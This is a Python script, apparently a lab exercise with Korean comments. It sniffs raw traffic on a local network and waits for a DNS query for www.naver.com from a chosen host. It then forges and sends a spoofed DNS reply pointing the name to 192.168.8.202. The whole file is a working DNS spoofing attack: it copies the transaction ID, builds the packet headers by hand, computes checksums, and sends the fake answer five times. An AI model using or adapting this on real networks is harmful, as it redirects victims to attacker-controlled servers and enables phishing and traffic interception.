import socket
import struct
from new_packet_sniffer import Ethernet
from new_packet_sniffer import ARP
from new_packet_sniffer import IP
from new_packet_sniffer import ICMP
from new_packet_sniffer import Echo
from new_packet_sniffer import UDP
from new_packet_sniffer import TCP
from new_packet_sniffer import Packet
from mydns import DNS

# 체크섬 필드 계산 함수
def make_chksum( header ):
  size = len(header)
  if size % 2:
    header += b'\x00'
    size += 1
  size //= 2
  header = struct.unpack('!' + str(size) + 'H', header)
  chksum = sum(header)
  carry = chksum >> 16
  while carry > 0:
    chksum = chksum & 0xFFFF
    chksum += carry
    carry = chksum >> 16
  chksum = chksum ^ 0xFFFF
  return chksum

raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
raw.bind(('eth0',0))

while True:
  data = raw.recv(65535)
  recv_packet = Packet(data)
  if recv_packet.eth.type == 0x0800 and recv_packet.ip.protocol == 17 and ( recv_packet.ip.dstIp == '172.30.1.41' or recv_packet.ip.srcIp == '172.30.1.41' ) and ( recv_packet.udp.dst_port == 53 ):
    recv_dns = DNS(data[42:])
    if recv_dns.query_name == "www.naver.com" :
      break
print(data)
dns = DNS()
udp = UDP()
ip = IP()
eth = Ethernet()

# query feild
dns.identification = recv_dns.identification
dns._codes_and_flags = b'\x80\x00'
dns.total_questions = 1
dns.total_answers = 1
dns.total_authority = 0
dns.total_additional = 0
dns._query_name = b'\x03www\x05naver\x03com\x00'
dns.query_type = 1
dns.query_class = 1
# answer feild
dns._answer_name = b'\xc0\x0c'
dns.answer_type = 1
dns.answer_class = 1
dns.answer_ttl = 60000
dns.answer_data_length = 4
dns.answer_address = '192.168.8.202'
# udp header
udp.src_port = recv_packet.udp.dst_port
udp.dst_port = recv_packet.udp.src_port
udp.length = len(dns.get_header()) + 8
udp.checksum = 0
udp._data = dns.get_header()
# ip header
ip.version = 4
ip.headerLen = 20
ip.typeOfService = 0
ip.totLength = len(udp.get_header()) + 20
ip.identification = 1104
ip.ipFlags = 0
ip.fragmentOffset = 0
ip.timeToLive = 64
ip.protocol = 17
ip.headerChecksum = 0
ip.srcIp = recv_packet.ip.dstIp
ip.dstIp = recv_packet.ip.srcIp
ip.headerChecksum = make_chksum(ip.get_header())
# eth header
eth.src = recv_packet.eth.dst
eth.dst = recv_packet.eth.src
eth.type = 0x0800

tcp_totLength = ( ip.totLength - len( ip.get_header() ) )
tcp_totLength_Byte = struct.pack('!H', tcp_totLength)
pseudo_header = ip._srcIp + ip._dstIp + b'\x00' + ip._protocol + tcp_totLength_Byte + udp.get_header()
udp.checksum = make_chksum( pseudo_header )

send_packet = eth.get_header() + ip.get_header() + udp.get_header()
packet = Packet( send_packet )
print( send_packet )
i = 0
while i != 5:
  raw.send( send_packet )
  print("********************* IP Header ********************")
  print(packet.ip.srcIp, '->', packet.ip.dstIp, packet.eth.type)
  print('version :', packet.ip.version)
  print('headerLen :', packet.ip.headerLen)
  print('typeOfService :', packet.ip.typeOfService)
  print('totLength :', packet.ip.totLength)
  print('identification :', packet.ip.identification)
  print('ipFlags :', packet.ip.ipFlags)
  print('fragmentOffset :', packet.ip.fragmentOffset)
  print('timeToLive :', packet.ip.timeToLive)
  print('protocol :', packet.ip.protocol)
  print('headerChecksum :', packet.ip.headerChecksum)
  print('srcIp :', packet.ip.srcIp)
  print('dstIp :', packet.ip.dstIp)
  print("******************** UDP Header *******************")
  print("src_port :", packet.udp.src_port)
  print("dst_port :", packet.udp.dst_port)
  print("length :", packet.udp.length)
  print("checksum :", packet.udp.checksum)
  print("data :", packet.udp.data)
  print("******************** DNS Header *******************")
  print("identification :", dns.identification)
  print("codes_and_flags :", dns.codes_and_flags)
  print("total_questions :", dns.total_questions)
  print("total_answers :", dns.total_answers)
  print("total_authority :", dns.total_authority)
  print("total_additional :", dns.total_additional)
  print("query_name :", dns.query_name)
  print("query_type :", dns.query_type)
  print("query_class :", dns.query_class)
  if ( ( dns.codes_and_flags & 0xF000 ) >> 15 )  == 1 and dns.total_answers >= 1:
    print("answer_name :", dns.answer_name)
    print("answer_type :", dns.answer_type)
    print("answer_class :", dns.answer_class)
    print("answer_ttl :", dns.answer_ttl)
    print("answer_data_length :", dns.answer_data_length)
    print("answer_address :", dns.answer_address)
    print("raw packet :", send_packet)
    print("         end")
  i += 1
